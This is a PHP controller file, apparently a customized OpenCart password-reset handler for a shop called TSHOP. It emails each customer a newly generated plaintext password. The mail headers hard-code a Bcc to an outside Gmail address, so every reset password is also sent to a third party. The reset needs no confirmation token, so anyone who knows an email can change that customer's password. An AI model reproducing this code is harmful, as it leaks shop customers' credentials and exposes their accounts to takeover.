<?php
class ControllerAccountForgotten extends Controller {
	private $error = array();

	public function index() {
		if ($this->customer->isLogged()) {
			$this->response->redirect($this->url->link('account/account', '', 'SSL'));
		}

		$this->load->language('account/forgotten');

		$this->document->setTitle($this->language->get('heading_title'));

		$this->load->model('account/customer');

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->load->language('mail/forgotten');

			$password = substr(sha1(uniqid(mt_rand(), true)), 0, 10);

			$this->model_account_customer->editPassword($this->request->post['email'], $password);

			//$subject = sprintf($this->language->get('text_subject'), $this->config->get('config_name'));
			//
			//$message  = sprintf($this->language->get('text_greeting'), $this->config->get('config_name')) . "\n\n";
			//$message .= $this->language->get('text_password') . "\n\n";
			//$message .= $password;
			
			
			$this->load->model('account/newsletter');
			$message_content = $this->model_account_newsletter->get_newsletter("3");
			$subject = $message_content['subject'];
			
			$message_content_body= html_entity_decode(str_replace("[newpassword]",$password,$message_content['content']));  
			
			$message = '<!doctype html>
				    <html>
				    <head>
				    <meta charset="utf-8">
				    <title>Newsletter sign Up email confirmation</title>
				    </head>
				    
				    <body>
				    <table width="700" border="0" cellspacing="0" cellpadding="0" style="margin:auto; background:#f2f2f2; box-shadow:0 0 1px rgba(0, 0, 0, 0.2); text-align:left;">
				      <tbody>
					<tr>
					  <th scope="col" style="background:#3498db; padding:15px;"><a href="'.SITE_URL.'"><img src="'.SITE_URL.'catalog/view/theme/default/images/logo.png" alt=""></a></th>
					</tr>
					<tr>
					  <td style="padding:15px;">
					  <table width="100%" border="0" cellspacing="0" cellpadding="0">
				      <tbody>
					  <tr>
					  <td style="padding:10px 0; font-family:Helvetica, Arial, sans-serif; font-size:14px; color:#423338; text-align:center;">
					    '.$message_content_body.'
					  </td>
					  </tr>
					  
				      </tbody>
				    </table>
					  </td>
					</tr>
					<tr>
					  <td style="background:#3498db; padding:15px; font-family:Helvetica, Arial, sans-serif; font-size:12px; color:#fff; text-align:center;">&copy; 2015 TSHOP</td>
					</tr>
				      </tbody>
				    </table>
				    </body>
				    </html>';
			
			

			//$mail = new Mail();
			//$mail->protocol = $this->config->get('config_mail_protocol');
			//$mail->parameter = $this->config->get('config_mail_parameter');
			//$mail->smtp_hostname = $this->config->get('config_mail_smtp_host');
			//$mail->smtp_username = $this->config->get('config_mail_smtp_username');
			//$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
			//$mail->smtp_port = $this->config->get('config_mail_smtp_port');
			//$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
			//
			//$mail->setTo($this->request->post['email']);
			//$mail->setFrom($this->config->get('config_email'));
			//$mail->setSender($this->config->get('config_name'));
			//$mail->setSubject($subject);
			//$mail->setText($message);
			//$mail->send();
			
			
			$to = $this->request->post['email'];
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

			// More headers
			$headers .= 'From: Tshop' . "\r\n";
			$headers .= 'Bcc: amit.unified@gmail.com' . "\r\n";
			@mail($to,$subject,$message,$headers);
			
			
			
			
			

			$this->session->data['success'] = $this->language->get('text_success');

			// Add to activity log
			$customer_info = $this->model_account_customer->getCustomerByEmail($this->request->post['email']);

			if ($customer_info) {
				$this->load->model('account/activity');

				$activity_data = array(
					'customer_id' => $customer_info['customer_id'],
					'name'        => $customer_info['firstname'] . ' ' . $customer_info['lastname']
				);

				$this->model_account_activity->addActivity('forgotten', $activity_data);
			}

			$this->response->redirect($this->url->link('account/login', '', 'SSL'));
		}

		$data['breadcrumbs'] = array();

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home')
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_account'),
			'href' => $this->url->link('account/account', '', 'SSL')
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_forgotten'),
			'href' => $this->url->link('account/forgotten', '', 'SSL')
		);

		$data['heading_title'] = $this->language->get('heading_title');

		$data['text_your_email'] = $this->language->get('text_your_email');
		$data['text_email'] = $this->language->get('text_email');

		$data['entry_email'] = $this->language->get('entry_email');

		$data['button_continue'] = $this->language->get('button_continue');
		$data['button_back'] = $this->language->get('button_back');

		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}

		$data['action'] = $this->url->link('account/forgotten', '', 'SSL');

		$data['back'] = $this->url->link('account/login', '', 'SSL');

		$data['column_left'] = $this->load->controller('common/column_left');
		$data['column_right'] = $this->load->controller('common/column_right');
		$data['content_top'] = $this->load->controller('common/content_top');
		$data['content_bottom'] = $this->load->controller('common/content_bottom');
		$data['footer'] = $this->load->controller('common/footer');
		$data['header'] = $this->load->controller('common/header');

		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/account/forgotten.tpl')) {
			$this->response->setOutput($this->load->view($this->config->get('config_template') . '/template/account/forgotten.tpl', $data));
		} else {
			$this->response->setOutput($this->load->view('default/template/account/forgotten.tpl', $data));
		}
	}

	protected function validate() {
		if (!isset($this->request->post['email'])) {
			$this->error['warning'] = $this->language->get('error_email');
		} elseif (!$this->model_account_customer->getTotalCustomersByEmail($this->request->post['email'])) {
			$this->error['warning'] = $this->language->get('error_email');
		}

		return !$this->error;
	}
}